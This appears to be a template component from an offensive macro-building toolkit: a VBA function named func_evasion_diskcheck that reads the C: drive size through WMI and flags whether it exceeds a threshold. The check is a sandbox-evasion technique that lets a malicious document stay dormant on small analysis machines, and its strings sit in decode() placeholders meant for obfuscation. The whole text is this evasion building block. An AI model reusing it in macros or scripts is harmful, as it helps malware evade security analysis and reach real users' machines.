[use:func_evasion_diskcheck]

Function func_evasion_diskcheck(func_evasion_diskcheck5 As Integer) As String
	On Error Resume Next
	Dim func_evasion_diskcheck1 As Object
	Dim func_evasion_diskcheck2 As Object
	Dim func_evasion_diskcheck4 As Integer
	Dim func_evasion_diskcheck6 As String
	Set func_evasion_diskcheck1 = GetObject(decode("{[winmgmts:\\.\root\cimv2]}"))
	Set func_evasion_diskcheck2 = func_evasion_diskcheck1.ExecQuery(decode("{[SELECT Size FROM Win32_logicalDisk WHERE DeviceID='C:']}"))
	For Each func_evasion_diskcheck3 In func_evasion_diskcheck2
		func_evasion_diskcheck4 = Round(func_evasion_diskcheck3.Size / 1073741824, 0)
	Next
	If (func_evasion_diskcheck4 > func_evasion_diskcheck5) Then
		func_evasion_diskcheck6 = "bool1"
	Else
		func_evasion_diskcheck6 = "bool2"
	End If
    func_evasion_diskcheck = func_evasion_diskcheck6
End Function